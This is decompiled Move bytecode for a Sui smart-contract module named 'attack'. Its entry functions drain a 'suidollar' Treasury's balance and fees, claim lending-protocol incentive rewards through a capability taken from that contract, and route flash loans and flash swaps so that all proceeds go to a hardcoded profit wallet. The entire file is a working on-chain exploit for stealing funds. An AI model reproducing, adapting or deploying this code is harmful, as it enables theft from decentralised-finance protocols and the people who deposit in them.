module 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::attack {
    public entry fun attack_all<T0, T1>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T0>, arg2: &0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::MyStruct, arg3: &0x2::clock::Clock, arg4: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::Incentive, arg5: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::storage::Storage, arg6: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::RewardFund<T1>, arg7: vector<0x1::ascii::String>, arg8: vector<address>, arg9: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(drain<T0>(arg1), arg9), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(0x2::coin::from_balance<T1>(claim<T1>(arg2, arg3, arg4, arg5, arg6, arg7, arg8), arg9), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
    }

    public entry fun attack_flash<T0, T1, T2, T3>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T0, T1>, arg2: u64, arg3: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T2>, arg4: &0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::MyStruct, arg5: &0x2::clock::Clock, arg6: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::Incentive, arg7: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::storage::Storage, arg8: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::RewardFund<T3>, arg9: vector<0x1::ascii::String>, arg10: vector<address>, arg11: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<T0, T1>(arg1, arg2, arg11);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<T0, T1>(arg1, v0, v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<T2>>(0x2::coin::from_balance<T2>(drain<T2>(arg3), arg11), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        0x2::transfer::public_transfer<0x2::coin::Coin<T3>>(0x2::coin::from_balance<T3>(claim<T3>(arg4, arg5, arg6, arg7, arg8, arg9, arg10), arg11), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
    }

    public entry fun attack_settle_flash<T0, T1, T2>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<0x2::sui::SUI, T0>, arg2: u64, arg3: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T1>, arg4: &0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::MyStruct, arg5: &0x2::clock::Clock, arg6: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::Incentive, arg7: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::storage::Storage, arg8: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::RewardFund<T2>, arg9: &mut 0xa0eba10b173538c8fecca1dff298e488402cc9ff374f8a12ca7758eebe830b66::spot_dex::Pool<T2, 0x2::sui::SUI>, arg10: &0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::config::GlobalConfig, arg11: &mut 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::Pool<T1, 0x2::sui::SUI>, arg12: vector<0x1::ascii::String>, arg13: vector<address>, arg14: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<0x2::sui::SUI, T0>(arg1, arg2, arg14);
        let v2 = 0x2::coin::into_balance<0x2::sui::SUI>(v0);
        let v3 = drain<T1>(arg3);
        let v4 = 0x2::coin::from_balance<T2>(claim<T2>(arg4, arg5, arg6, arg7, arg8, arg12, arg13), arg14);
        let (v5, v6, v7) = 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::flash_swap<T1, 0x2::sui::SUI>(arg10, arg11, true, true, 0x2::balance::value<T1>(&v3), 4295048016, arg5);
        let v8 = v7;
        0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::repay_flash_swap<T1, 0x2::sui::SUI>(arg10, arg11, 0x2::balance::split<T1>(&mut v3, 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::swap_pay_amount<T1, 0x2::sui::SUI>(&v8)), 0x2::balance::zero<0x2::sui::SUI>(), v8);
        0x2::balance::join<T1>(&mut v3, v5);
        0x2::balance::join<0x2::sui::SUI>(&mut v2, 0x2::coin::into_balance<0x2::sui::SUI>(0xa0eba10b173538c8fecca1dff298e488402cc9ff374f8a12ca7758eebe830b66::spot_dex::swap_token_x<T2, 0x2::sui::SUI>(arg9, v4, 0x2::coin::value<T2>(&v4), 0, arg14)));
        0x2::balance::join<0x2::sui::SUI>(&mut v2, v6);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<0x2::sui::SUI, T0>(arg1, 0x2::coin::from_balance<0x2::sui::SUI>(0x2::balance::split<0x2::sui::SUI>(&mut v2, arg2), arg14), v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::from_balance<0x2::sui::SUI>(v2, arg14), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        if (0x2::balance::value<T1>(&v3) == 0) {
            0x2::balance::destroy_zero<T1>(v3);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(0x2::coin::from_balance<T1>(v3, arg14), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        };
    }

    fun claim<T0>(arg0: &0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::MyStruct, arg1: &0x2::clock::Clock, arg2: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::Incentive, arg3: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::storage::Storage, arg4: &mut 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::RewardFund<T0>, arg5: vector<0x1::ascii::String>, arg6: vector<address>) : 0x2::balance::Balance<T0> {
        let v0 = 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::get_account_cap(arg0);
        let v1 = 0x1::vector::length<address>(&arg6);
        assert!(v1 > 0 && v1 == 0x1::vector::length<0x1::ascii::String>(&arg5), 0);
        let v2 = 0x2::balance::zero<T0>();
        let v3 = 0;
        while (v3 < v1) {
            let v4 = 0x1::vector::empty<0x1::ascii::String>();
            0x1::vector::push_back<0x1::ascii::String>(&mut v4, *0x1::vector::borrow<0x1::ascii::String>(&arg5, v3));
            let v5 = 0x1::vector::empty<address>();
            0x1::vector::push_back<address>(&mut v5, *0x1::vector::borrow<address>(&arg6, v3));
            0x2::balance::join<T0>(&mut v2, 0xd899cf7d2b5db716bd2cf55599fb0d5ee38a3061e7b6bb6eebf73fa5bc4c81ca::incentive_v3::claim_reward_with_account_cap<T0>(arg1, arg2, arg3, arg4, v4, v5, v0));
            v3 = v3 + 1;
        };
        v2
    }

    fun drain<T0>(arg0: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T0>) : 0x2::balance::Balance<T0> {
        let v0 = 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::get_balance<T0>(arg0);
        let v1 = 0x2::balance::split<T0>(v0, 0x2::balance::value<T0>(v0));
        let v2 = 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::get_fee_balance<T0>(arg0);
        0x2::balance::join<T0>(&mut v1, 0x2::balance::split<T0>(v2, 0x2::balance::value<T0>(v2)));
        v1
    }

    public entry fun drain_flash<T0, T1>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<0x2::sui::SUI, T0>, arg2: u64, arg3: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T1>, arg4: &0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::config::GlobalConfig, arg5: &mut 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::Pool<T1, 0x2::sui::SUI>, arg6: &0x2::clock::Clock, arg7: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<0x2::sui::SUI, T0>(arg1, arg2, arg7);
        let v2 = 0x2::coin::into_balance<0x2::sui::SUI>(v0);
        let v3 = drain<T1>(arg3);
        let (v4, v5, v6) = 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::flash_swap<T1, 0x2::sui::SUI>(arg4, arg5, true, true, 0x2::balance::value<T1>(&v3), 4295048016, arg6);
        let v7 = v6;
        0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::repay_flash_swap<T1, 0x2::sui::SUI>(arg4, arg5, 0x2::balance::split<T1>(&mut v3, 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::swap_pay_amount<T1, 0x2::sui::SUI>(&v7)), 0x2::balance::zero<0x2::sui::SUI>(), v7);
        0x2::balance::join<T1>(&mut v3, v4);
        0x2::balance::join<0x2::sui::SUI>(&mut v2, v5);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<0x2::sui::SUI, T0>(arg1, 0x2::coin::from_balance<0x2::sui::SUI>(0x2::balance::split<0x2::sui::SUI>(&mut v2, arg2), arg7), v1);
        if (0x2::balance::value<T1>(&v3) == 0) {
            0x2::balance::destroy_zero<T1>(v3);
        } else {
            let (v8, v9, v10) = 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::flash_swap<T1, 0x2::sui::SUI>(arg4, arg5, true, true, 0x2::balance::value<T1>(&v3), 4295048016, arg6);
            let v11 = v10;
            0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::repay_flash_swap<T1, 0x2::sui::SUI>(arg4, arg5, 0x2::balance::split<T1>(&mut v3, 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::swap_pay_amount<T1, 0x2::sui::SUI>(&v11)), 0x2::balance::zero<0x2::sui::SUI>(), v11);
            0x2::balance::join<T1>(&mut v3, v8);
            0x2::balance::join<0x2::sui::SUI>(&mut v2, v9);
            if (0x2::balance::value<T1>(&v3) == 0) {
                0x2::balance::destroy_zero<T1>(v3);
            } else {
                0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(0x2::coin::from_balance<T1>(v3, arg7), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
            };
        };
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::from_balance<0x2::sui::SUI>(v2, arg7), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
    }

    public entry fun drain_only<T0>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T0>, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(drain<T0>(arg1), arg2), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
    }

    public entry fun drain_settle<T0>(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &mut 0xe8087c2b86351ce15e8d72e83a39c5772c0b1d054015ae9671305e686cef5034::suidollar::Treasury<T0>, arg2: &0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::config::GlobalConfig, arg3: &mut 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::Pool<T0, 0x2::sui::SUI>, arg4: &0x2::clock::Clock, arg5: &mut 0x2::tx_context::TxContext) {
        let v0 = drain<T0>(arg1);
        let (v1, v2, v3) = 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::flash_swap<T0, 0x2::sui::SUI>(arg2, arg3, true, true, 0x2::balance::value<T0>(&v0), 4295048016, arg4);
        let v4 = v3;
        0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::repay_flash_swap<T0, 0x2::sui::SUI>(arg2, arg3, 0x2::balance::split<T0>(&mut v0, 0x1eabed72c53feb3805120a081dc15963c204dc8d091542592abaf7a35689b2fb::pool::swap_pay_amount<T0, 0x2::sui::SUI>(&v4)), 0x2::balance::zero<0x2::sui::SUI>(), v4);
        0x2::balance::join<T0>(&mut v0, v1);
        0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(0x2::coin::from_balance<0x2::sui::SUI>(v2, arg5), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        if (0x2::balance::value<T0>(&v0) == 0) {
            0x2::balance::destroy_zero<T0>(v0);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(0x2::coin::from_balance<T0>(v0, arg5), 0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::consts::profit_wallet());
        };
    }

    public fun link_refs(arg0: &0x38ca3d7bb578eed8df4cccab2bca7d473b66d045d745bf8fe870f7e000ff2e24::owner::OwnerCap, arg1: &0x3::sui_system::SuiSystemState, arg2: &0x3a75968d0951fc99e7b336b26088d0f6888efd691b9cf2ac61c3958cfaa6d41b::validator::OwnerCap, arg3: &0x5306f64e312b581766351c07af79c72fcb1cd25147157fdc2f8ad76de9a3fb6a::bytes32::Bytes32, arg4: &0x5d8fbbf6f908a4af8c6d072669a462d53e03eb3c1d863bd0359dc818c69ea706::price_data_pull::PriceData, arg5: &0x634511c660964940915acb37dde75963e35f2d1b0a034b41e2da8f3e9d1491ae::fee_config::FeeConfig, arg6: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::i64::I64, arg7: &0xc3c7e6eb7202e9fb0389a2f7542b91cc40e4f7a33c02554fec11c4c92f938ea3::aggregator::CurrentResult, arg8: &0xca441b44943c16be0e6e23c5a955bb971537ea3289ae8016fbf33fffe1fd210f::config::OracleConfig, arg9: &0x714a63a0dba6da4f017b42d5d0fb78867f18bcde904868e51d951a5a6f5b7f57::i64::I64, arg10: &0xbe21a06129308e0495431d12286127897aff07a8ade3970495a4404d97f9eaaa::linked_table::LinkedTable<u8, u8>, arg11: &0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP, 0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>) {
    }

    // decompiled from Move bytecode v7
}

